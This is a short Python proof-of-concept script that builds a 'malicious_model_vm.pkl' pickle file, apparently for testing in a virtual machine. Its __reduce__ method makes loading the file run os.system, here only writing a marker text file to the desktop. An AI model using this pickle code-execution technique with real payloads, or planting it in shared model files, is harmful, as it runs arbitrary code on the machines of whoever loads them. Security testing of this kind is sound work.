import os
import pickle
from pathlib import Path


SAMPLES_DIR = Path(__file__).resolve().parent.parent / "samples"
PICKLE_PATH = SAMPLES_DIR / "malicious_model_vm.pkl"


class MaliciousModel:
    def __reduce__(self):
        command = r'cmd /c echo PAYLOAD_EXECUTED> "C:\Users\vboxuser\Desktop\payload_executed.txt"'
        return (os.system, (command,))


def main():
    SAMPLES_DIR.mkdir(parents=True, exist_ok=True)

    with PICKLE_PATH.open("wb") as file:
        pickle.dump(MaliciousModel(), file)

    print("Created:", PICKLE_PATH)


if __name__ == "__main__":
    main()
